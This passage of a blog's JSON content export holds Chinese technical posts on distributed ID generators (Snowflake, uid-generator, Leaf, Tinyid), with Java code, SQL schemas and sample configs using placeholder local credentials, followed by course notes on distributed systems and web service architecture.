class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SnowFlakeShortUrl</span><span class=\"params\">(<span class=\"keyword\">long</span> dataCenterId, <span class=\"keyword\">long</span> machineId)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (dataCenterId &gt; MAX_DATA_CENTER_NUM || dataCenterId &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(<span class=\"string\">&quot;DtaCenterId can&#x27;t be greater than MAX_DATA_CENTER_NUM or less than 0！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (machineId &gt; MAX_MACHINE_NUM || machineId &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(<span class=\"string\">&quot;MachineId can&#x27;t be greater than MAX_MACHINE_NUM or less than 0！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.dataCenterId = dataCenterId;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.machineId = machineId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 产生下一个ID</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">long</span> <span class=\"title\">nextId</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> currTimeStamp = getNewTimeStamp();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (currTimeStamp &lt; lastTimeStamp) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">&quot;Clock moved backwards.  Refusing to generate id&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (currTimeStamp == lastTimeStamp) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//相同毫秒内，序列号自增</span></span><br><span class=\"line\">            sequence = (sequence + <span class=\"number\">1</span>) &amp; MAX_SEQUENCE;</span><br><span class=\"line\">            <span class=\"comment\">//同一毫秒的序列数已经达到最大</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (sequence == <span class=\"number\">0L</span>) &#123;</span><br><span class=\"line\">                currTimeStamp = getNextMill();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//不同毫秒内，序列号置为0</span></span><br><span class=\"line\">            sequence = <span class=\"number\">0L</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        lastTimeStamp = currTimeStamp;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (currTimeStamp - START_TIMESTAMP) &lt;&lt; TIMESTAMP_LEFT <span class=\"comment\">//时间戳部分</span></span><br><span class=\"line\">                | dataCenterId &lt;&lt; DATA_CENTER_LEFT       <span class=\"comment\">//数据中心部分</span></span><br><span class=\"line\">                | machineId &lt;&lt; MACHINE_LEFT             <span class=\"comment\">//机器标识部分</span></span><br><span class=\"line\">                | sequence;                             <span class=\"comment\">//序列号部分</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        SnowFlakeShortUrl snowFlake = <span class=\"keyword\">new</span> SnowFlakeShortUrl(<span class=\"number\">2</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; (<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">4</span>); i++) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//10进制</span></span><br><span class=\"line\">            System.out.println(snowFlake.nextId());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"uid-generator\"><a href=\"#uid-generator\" class=\"headerlink\" title=\"uid-generator\"></a>uid-generator</h2><p><a href=\"https://github.com/baidu/uid-generator\">uid-generator</a>是由百度技术部开发，基于Snowflake算法实现的，与原始的snowflake算法不同在于，uid-generator支持自定义时间戳、工作机器ID和序列号等各部分的位数，而且uid-generator中采用用户自定义workId的生成策略。</p>\n<p>uid-generator需要与数据库配合使用，需要新增一个<code>WORKER_NODE</code>表。当应用启动时会向数据库表中去插入一条数据，插入成功后返回的自增ID就是该机器的workId数据由host，port组成。</p>\n<p>workId，占用了22个bit位，时间占用了28个bit位，序列化占用了13个bit位，需要注意的是，和原始的snowflake不太一样，时间的单位是秒，而不是毫秒，workId也不一样，而且同一应用每次重启就会消费一个workId。</p>\n<h2 id=\"Leaf\"><a href=\"#Leaf\" class=\"headerlink\" title=\"Leaf\"></a>Leaf</h2><p><a href=\"https://github.com/Meituan-Dianping/Leaf\">Leaf</a>由美团开发，同时支持号段模式和snowflake算法模式，可以切换使用。</p>\n<h3 id=\"号段模式\"><a href=\"#号段模式\" class=\"headerlink\" title=\"号段模式\"></a>号段模式</h3><p>先建一张表<code>leaf_alloc</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> `leaf_alloc` (</span><br><span class=\"line\">  `biz_tag` <span class=\"type\">varchar</span>(<span class=\"number\">128</span>)  <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;&#x27;</span> COMMENT <span class=\"string\">&#x27;业务key&#x27;</span>,</span><br><span class=\"line\">  `max_id` <span class=\"type\">bigint</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;1&#x27;</span> COMMENT <span class=\"string\">&#x27;当前已经分配了的最大id&#x27;</span>,</span><br><span class=\"line\">  `step` <span class=\"type\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> COMMENT <span class=\"string\">&#x27;初始步长，也是动态调整的最小步长&#x27;</span>,</span><br><span class=\"line\">  `description` <span class=\"type\">varchar</span>(<span class=\"number\">256</span>)  <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">NULL</span> COMMENT <span class=\"string\">&#x27;业务key的描述&#x27;</span>,</span><br><span class=\"line\">  `update_time` <span class=\"type\">timestamp</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"built_in\">CURRENT_TIMESTAMP</span> <span class=\"keyword\">ON</span> UPDATE <span class=\"built_in\">CURRENT_TIMESTAMP</span> COMMENT <span class=\"string\">&#x27;数据库维护的更新时间&#x27;</span>,</span><br><span class=\"line\">  <span class=\"keyword\">PRIMARY</span> KEY (`biz_tag`)</span><br><span class=\"line\">) ENGINE<span class=\"operator\">=</span>InnoDB;</span><br></pre></td></tr></table></figure>\n<p>然后在项目中开启号段模式，配置对应的数据库信息，并关闭snowflake模式<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">leaf.name=com.sankuai.leaf.opensource.test</span></span><br><span class=\"line\"><span class=\"string\">leaf.segment.enable=true</span></span><br><span class=\"line\"><span class=\"string\">leaf.jdbc.url=jdbc:mysql://localhost:3306/leaf_test?useUnicode=true&amp;characterEncoding=utf8&amp;characterSetResults=utf8</span></span><br><span class=\"line\"><span class=\"string\">leaf.jdbc.username=root</span></span><br><span class=\"line\"><span class=\"string\">leaf.jdbc.password=root</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">leaf.snowflake.enable=false</span></span><br><span class=\"line\"><span class=\"comment\">#leaf.snowflake.zk.address=</span></span><br><span class=\"line\"><span class=\"comment\">#leaf.snowflake.port=</span></span><br></pre></td></tr></table></figure><br>启动leaf-server模块的<code>LeafServerApplication</code>，项目就跑起来了</p>\n<ul>\n<li>号段模式获取分布式自增ID的测试url：<code>http：//localhost:8080/api/segment/get/leaf-segment-test</code></li>\n<li>监控号段模式：<code>http://localhost:8080/cache</code></li>\n</ul>\n<h3 id=\"snowflake模式\"><a href=\"#snowflake模式\" class=\"headerlink\" title=\"snowflake模式\"></a>snowflake模式</h3><p>Leaf的snowflake模式依赖于ZooKeeper，不同于原始snowflake算法也主要是在workId的生成上，Leaf中workId是基于ZooKeeper的顺序Id来生成的，每个应用在使用Leaf-snowflake时，启动时都会都在Zookeeper中生成一个顺序Id，相当于一台机器对应一个顺序节点，也就是一个workId。</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">leaf.snowflake.enable=true</span></span><br><span class=\"line\"><span class=\"string\">leaf.snowflake.zk.address=127.0.0.1</span></span><br><span class=\"line\"><span class=\"string\">leaf.snowflake.port=2181</span></span><br></pre></td></tr></table></figure>\n<p>snowflake模式获取分布式自增ID的测试url：<code>http://localhost:8080/api/snowflake/get/test</code></p>\n<h2 id=\"Tinyid\"><a href=\"#Tinyid\" class=\"headerlink\" title=\"Tinyid\"></a>Tinyid</h2><p><a href=\"https://github.com/didi/tinyid\">Tinyid</a>是基于号段模式原理实现的与Leaf如出一辙，每个服务获取一个号段（1000,2000]、（2000,3000]、（3000,4000]</p>\n<p><img src=\"2.png\" alt=\"\"></p>\n<p>Tinyid提供<code>http</code>和<code>tinyid-client</code>两种方式接入</p>\n<h3 id=\"Http方式接入\"><a href=\"#Http方式接入\" class=\"headerlink\" title=\"Http方式接入\"></a>Http方式接入</h3><ol>\n<li>创建数据表：<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> `tiny_id_info` (</span><br><span class=\"line\">  `id` <span class=\"type\">bigint</span>(<span class=\"number\">20</span>) unsigned <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> AUTO_INCREMENT COMMENT <span class=\"string\">&#x27;自增主键&#x27;</span>,</span><br><span class=\"line\">  `biz_type` <span class=\"type\">varchar</span>(<span class=\"number\">63</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;&#x27;</span> COMMENT <span class=\"string\">&#x27;业务类型，唯一&#x27;</span>,</span><br><span class=\"line\">  `begin_id` <span class=\"type\">bigint</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;0&#x27;</span> COMMENT <span class=\"string\">&#x27;开始id，仅记录初始值，无其他含义。初始化时begin_id和max_id应相同&#x27;</span>,</span><br><span class=\"line\">  `max_id` <span class=\"type\">bigint</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;0&#x27;</span> COMMENT <span class=\"string\">&#x27;当前最大id&#x27;</span>,</span><br><span class=\"line\">  `step` <span class=\"type\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;0&#x27;</span> COMMENT <span class=\"string\">&#x27;步长&#x27;</span>,</span><br><span class=\"line\">  `delta` <span class=\"type\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;1&#x27;</span> COMMENT <span class=\"string\">&#x27;每次id增量&#x27;</span>,</span><br><span class=\"line\">  `remainder` <span class=\"type\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;0&#x27;</span> COMMENT <span class=\"string\">&#x27;余数&#x27;</span>,</span><br><span class=\"line\">  `create_time` <span class=\"type\">timestamp</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;2010-01-01 00:00:00&#x27;</span> COMMENT <span class=\"string\">&#x27;创建时间&#x27;</span>,</span><br><span class=\"line\">  `update_time` <span class=\"type\">timestamp</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;2010-01-01 00:00:00&#x27;</span> COMMENT <span class=\"string\">&#x27;更新时间&#x27;</span>,</span><br><span class=\"line\">  `version` <span class=\"type\">bigint</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;0&#x27;</span> COMMENT <span class=\"string\">&#x27;版本号&#x27;</span>,</span><br><span class=\"line\">  <span class=\"keyword\">PRIMARY</span> KEY (`id`),</span><br><span class=\"line\">  <span class=\"keyword\">UNIQUE</span> KEY `uniq_biz_type` (`biz_type`)</span><br><span class=\"line\">) ENGINE<span class=\"operator\">=</span>InnoDB AUTO_INCREMENT<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">DEFAULT</span> CHARSET<span class=\"operator\">=</span>utf8 COMMENT <span class=\"string\">&#x27;id信息表&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> `tiny_id_token` (</span><br><span class=\"line\">  `id` <span class=\"type\">int</span>(<span class=\"number\">11</span>) unsigned <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> AUTO_INCREMENT COMMENT <span class=\"string\">&#x27;自增id&#x27;</span>,</span><br><span class=\"line\">  `token` <span class=\"type\">varchar</span>(<span class=\"number\">255</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;&#x27;</span> COMMENT <span class=\"string\">&#x27;token&#x27;</span>,</span><br><span class=\"line\">  `biz_type` <span class=\"type\">varchar</span>(<span class=\"number\">63</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;&#x27;</span> COMMENT <span class=\"string\">&#x27;此token可访问的业务类型标识&#x27;</span>,</span><br><span class=\"line\">  `remark` <span class=\"type\">varchar</span>(<span class=\"number\">255</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;&#x27;</span> COMMENT <span class=\"string\">&#x27;备注&#x27;</span>,</span><br><span class=\"line\">  `create_time` <span class=\"type\">timestamp</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;2010-01-01 00:00:00&#x27;</span> COMMENT <span class=\"string\">&#x27;创建时间&#x27;</span>,</span><br><span class=\"line\">  `update_time` <span class=\"type\">timestamp</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">&#x27;2010-01-01 00:00:00&#x27;</span> COMMENT <span class=\"string\">&#x27;更新时间&#x27;</span>,</span><br><span class=\"line\">  <span class=\"keyword\">PRIMARY</span> KEY (`id`)</span><br><span class=\"line\">) ENGINE<span class=\"operator\">=</span>InnoDB AUTO_INCREMENT<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">DEFAULT</span> CHARSET<span class=\"operator\">=</span>utf8 COMMENT <span class=\"string\">&#x27;token信息表&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> `tiny_id_info` (`id`, `biz_type`, `begin_id`, `max_id`, `step`, `delta`, `remainder`, `create_time`, `update_time`, `version`)</span><br><span class=\"line\"><span class=\"keyword\">VALUES</span></span><br><span class=\"line\">    (<span class=\"number\">1</span>, <span class=\"string\">&#x27;test&#x27;</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">100000</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"string\">&#x27;2018-07-21 23:52:58&#x27;</span>, <span class=\"string\">&#x27;2018-07-22 23:19:27&#x27;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> `tiny_id_info` (`id`, `biz_type`, `begin_id`, `max_id`, `step`, `delta`, `remainder`, `create_time`, `update_time`, `version`)</span><br><span class=\"line\"><span class=\"keyword\">VALUES</span></span><br><span class=\"line\">    (<span class=\"number\">2</span>, <span class=\"string\">&#x27;test_odd&#x27;</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">100000</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"string\">&#x27;2018-07-21 23:52:58&#x27;</span>, <span class=\"string\">&#x27;2018-07-23 00:39:24&#x27;</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> `tiny_id_token` (`id`, `token`, `biz_type`, `remark`, `create_time`, `update_time`)</span><br><span class=\"line\"><span class=\"keyword\">VALUES</span></span><br><span class=\"line\">    (<span class=\"number\">1</span>, <span class=\"string\">&#x27;0f673adf80504e2eaa552f5d791b644c&#x27;</span>, <span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>, <span class=\"string\">&#x27;2017-12-14 16:36:46&#x27;</span>, <span class=\"string\">&#x27;2017-12-14 16:36:48&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> `tiny_id_token` (`id`, `token`, `biz_type`, `remark`, `create_time`, `update_time`)</span><br><span class=\"line\"><span class=\"keyword\">VALUES</span></span><br><span class=\"line\">    (<span class=\"number\">2</span>, <span class=\"string\">&#x27;0f673adf80504e2eaa552f5d791b644c&#x27;</span>, <span class=\"string\">&#x27;test_odd&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>, <span class=\"string\">&#x27;2017-12-14 16:36:46&#x27;</span>, <span class=\"string\">&#x27;2017-12-14 16:36:48&#x27;</span>);</span><br></pre></td></tr></table></figure></li>\n<li>配置数据库：<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">datasource.tinyid.names=primary</span></span><br><span class=\"line\"><span class=\"string\">datasource.tinyid.primary.driver-class-name=com.mysql.jdbc.Driver</span></span><br><span class=\"line\"><span class=\"string\">datasource.tinyid.primary.url=jdbc:mysql://ip:port/databaseName?autoReconnect=true&amp;useUnicode=true&amp;characterEncoding=UTF-8</span></span><br><span class=\"line\"><span class=\"string\">datasource.tinyid.primary.username=root</span></span><br><span class=\"line\"><span class=\"string\">datasource.tinyid.primary.password=123456</span></span><br></pre></td></tr></table></figure></li>\n<li>启动tinyid-server后测试<br>获取分布式自增ID: <code>http://localhost:9999/tinyid/id/nextIdSimple?bizType=test&amp;token=0f673adf80504e2eaa552f5d791b644c</code><br>返回结果: <code>3</code></li>\n</ol>\n<p>批量获取分布式自增ID:<code>http://localhost:9999/tinyid/id/nextIdSimple?bizType=test&amp;token=0f673adf80504e2eaa552f5d791b644c&amp;batchSize=10</code><br>返回结果:  <code>4,5,6,7,8,9,10,11,12,13</code></p>\n<h3 id=\"Java客户端方式接入\"><a href=\"#Java客户端方式接入\" class=\"headerlink\" title=\"Java客户端方式接入\"></a>Java客户端方式接入</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.xiaoju.uemc.tinyid<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>tinyid-client<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;tinyid.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>配置文件<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">tinyid.server</span> <span class=\"string\">=localhost:9999</span></span><br><span class=\"line\"><span class=\"string\">tinyid.token</span> <span class=\"string\">=0f673adf80504e2eaa552f5d791b644c</span></span><br></pre></td></tr></table></figure></p>\n<p><code>test</code>，<code>tinyid.token</code>是在数据库表中预先插入的数据，<code>test</code>是具体业务类型，<code>tinyid.token</code>表示可访问的业务类型</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获取单个分布式自增ID</span></span><br><span class=\"line\">Long id =  TinyId . nextId( <span class=\"string\">&quot; test &quot;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 按需批量分布式自增ID</span></span><br><span class=\"line\">List&lt;Long&gt; ids =  TinyId . nextId( <span class=\"string\">&quot; test &quot;</span> , <span class=\"number\">10</span> );</span><br></pre></td></tr></table></figure>\n<p><strong>总结</strong>：每种分布式ID生成ID都有各自的优缺点，在实际业务中，还是应该仔细分析实际的需求，结合使用场景，选取最适合的方案。</p>\n<blockquote>\n<p>参考资料：</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/w_monster/article/details/104244845\">https://blog.csdn.net/w_monster/article/details/104244845</a></li>\n<li><a href=\"https://www.jianshu.com/p/4ba1c5e8c185\">https://www.jianshu.com/p/4ba1c5e8c185</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000022717820\">https://segmentfault.com/a/1190000022717820</a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//www.cnblogs.com/imstudy/p/9766549.html\">https://link.zhihu.com/?target=https%3A//www.cnblogs.com/imstudy/p/9766549.html</a></li>\n<li><a href=\"https://blog.csdn.net/qq_23864697/article/details/88887252\">https://blog.csdn.net/qq_23864697/article/details/88887252</a></li>\n</ul>\n</blockquote>\n","tags":["分布式"]},{"title":"分布式系统导论","url":"/2018/11/19/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%AE%BA/","content":"<h1 id=\"概要\"><a href=\"#概要\" class=\"headerlink\" title=\"概要\"></a>概要</h1><p>分布式发展的趋势的产生由于</p>\n<ol>\n<li>高性能微处理器的发展</li>\n<li>计算机网络的发展  </li>\n</ol>\n<p>分布式系统的定义：<br>一组独立的计算机作为单个连贯系统出现在其用户身上。</p>\n<p>分布式特性：<br>无论何时何地进行交互，用户和应用程序都可以以一致且统一的方式与分发系统进行交互</p>\n<p>去中心化的算法：<br>没有设备拥有整个系统的状态信息，设备根据本机持有的信息决策，一台机器的失灵不会影响到整个系统。</p>\n<p>分布式系统的目标：</p>\n<ol>\n<li>更容易的访问和分享资源</li>\n<li>隐藏资源是分布的事实（分布透明）</li>\n<li>公开，可扩展</li>\n</ol>\n<span id=\"more\"></span>\n<p>p13</p>\n<p>12.23<br>[p183]面向流的通信：</p>\n<ul>\n<li>分组buffer</li>\n<li>QoS：服务评价标准</li>\n<li>流的同步</li>\n<li>网络视频必须预先加载：广告不卡是因为：广告存在cookie中，2-3M，cookie中存广告头，广告不需要缓冲</li>\n</ul>\n<p>[p198]广播问题：给多个节点广播消息</p>\n<ul>\n<li>熵减算法（必定收敛）</li>\n<li>gossip算法（不一定收敛，但接近生物学，收敛的概率大，且收敛的速度极快）</li>\n</ul>\n<p>12.27</p>\n<h1 id=\"第五章-命名\"><a href=\"#第五章-命名\" class=\"headerlink\" title=\"第五章 命名\"></a>第五章 命名</h1><p>在一个分布式系统中，一个名字对应一个访问点，访问点的名字又称地址。名称用作当标识符，一定要命名友好。</p>\n<ul>\n<li>平面命名法<ul>\n<li>广播，报文中包含目标节点：耗费资源，内网穿透不可行</li>\n<li>转发指针，一旦一个链断了，就崩溃</li>\n<li>基于宿主：需要一个维护全局名称地址映射的服务器，宿主服务器注册地址服务</li>\n</ul>\n</li>\n<li>结构命名法</li>\n<li>基于属性的命名</li>\n</ul>\n","tags":["分布式"]},{"title":"分布式组件与Web服务","url":"/2018/10/21/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BB%84%E4%BB%B6%E4%B8%8EWeb%E6%9C%8D%E5%8A%A1/","content":"<h1 id=\"分布式组件导论\"><a href=\"#分布式组件导论\" class=\"headerlink\" title=\"分布式组件导论\"></a>分布式组件导论</h1><h2 id=\"课程介绍\"><a href=\"#课程介绍\" class=\"headerlink\" title=\"课程介绍\"></a>课程介绍</h2><p>web服务是中间件的自然演化和企业平台整合的结果，他们想把www,英特网和社会全球化整合为一体，尤其在经济层面。</p>\n<p>我们本次课程要回答的问题是：<strong>什么是web服务，web服务如今能做什么</strong></p>\n<p>课程目标：</p>\n<ul>\n<li>理解web服务<ul>\n<li>为了能理解web服务，我们需要后退一步去看看分布式信息系统在过去十几年中变化的历史。</li>\n</ul>\n</li>\n<li>把web服务应用化<ul>\n<li>我们将回顾如今基本的web服务技术，并且详细讨论SOAP,UDDI,WSDL,SOA,BPEL</li>\n<li>我们也将探讨这些规格如今可以做什么，他们缺失了什么导致他们不能成为有效的工具投入商用</li>\n<li>课程目的旨在培养一种对当今web service技术和可能性的批判思维。</li>\n</ul>\n</li>\n</ul>\n<span id=\"more\"></span>\n<p>3 Aspects – Performance in the Course (20 points)<br>• A team with 5-7 persons to prepare a report with PPT to show a<br>case in any domain with SOA. Gives the reason why use SOA,<br>gives the architecture of the project, gives the services to be<br>invoked. – Final Examination(50 points)<br>• Test the extent to which you understand what have been taught – Assignment (choose any one in the following)<br>• A Report for this Course (30 points), At the end of the course,<br>submit a report about what is your view on web service, e.g., its<br>benefit to EAI, the problem when use it to build a information<br>system, and other problems you would like to discuss in your<br>report. Any aspects of the web service is OK.<br>• Experiment(30 points). At the end of the course, submit a<br>experimental report about how to invoke a web service, how to<br>deploy a web service on the web and how to compose multiple<br>web services together.</p>\n<h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><p>表示逻辑层(Presentation)：用户通过表示层，操作系统<br>应用逻辑层(Application Logic)：处理系统逻辑<br>资源管理器(Resource Manager)：提供永久存储</p>\n<p><img src=\"Screenshot_20181117_152003.png\" alt=\"\">  </p>\n<p>每一层都可以拆分成多个模块，模块增加带来的结果：</p>\n<ul>\n<li>分布式和并行的机会提升;对封装，组件设计，复用的需求提升</li>\n<li>更多的箭头，需要维护更多的链接，需要更多的坐标，系统的监控和维护变得更加复杂</li>\n<li>获取数据需要更多上下文的交换和更多中间步骤，性能的削减很可观</li>\n<li>系统设计师试图平衡模块设计的灵活性实际应用的性能要求。一旦一层建立后，它倾向于向下迁移并与较低层合并</li>\n</ul>\n<h3 id=\"自上而下的设计-Top-Down\"><a href=\"#自上而下的设计-Top-Down\" class=\"headerlink\" title=\"自上而下的设计(Top Down)\"></a>自上而下的设计(Top Down)</h3><p>系统的功能被分成几个模块，模块不能作为独立的组件，他们的功能需要其他模块的功能<br><img src=\"Screenshot_20181117_153117.png\" alt=\"\"></p>\n<h3 id=\"自下而上的设计-Bottom-Up\"><a href=\"#自下而上的设计-Bottom-Up\" class=\"headerlink\" title=\"自下而上的设计(Bottom Up)\"></a>自下而上的设计(Bottom Up)</h3><ul>\n<li>自下而上的设计中，很多基础的组件已经存在，这些是需要倍集成进新系统的独立系统</li>\n<li>这些老的组件不需要停机，当新组件产生时老的组件继续运行</li>\n<li>这种方法用途广泛因为底层的系统已经存在并且不能被轻易取代</li>\n<li>大部分这种情况下的工作和产品都和中间件相关—一种用来提供公共接口，桥异质性和应对分布的中间层<br><img src=\"Screenshot_20181117_153210.png\" alt=\"\"></li>\n</ul>\n<h3 id=\"一层：完全中心化\"><a href=\"#一层：完全中心化\" class=\"headerlink\" title=\"一层：完全中心化\"></a>一层：完全中心化</h3><ul>\n<li>表示层，逻辑层，资源管理起被做成一个单片的实体</li>\n<li>用户程序通过显示器命令行接入系统，但是如何显示显示什么由服务器决定</li>\n<li>这是一种典型的主机架构，有如下的优点<ul>\n<li>在控制流中没有强制的山下文切换</li>\n<li>一切都是中心化的，管理和控制资源非常容易</li>\n<li>这种设计可以通过模糊隔层之间的隔离来获得极高的优化<br><img src=\"Screenshot_20181117_165916.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"两层：客户端-服务器（C-S）\"><a href=\"#两层：客户端-服务器（C-S）\" 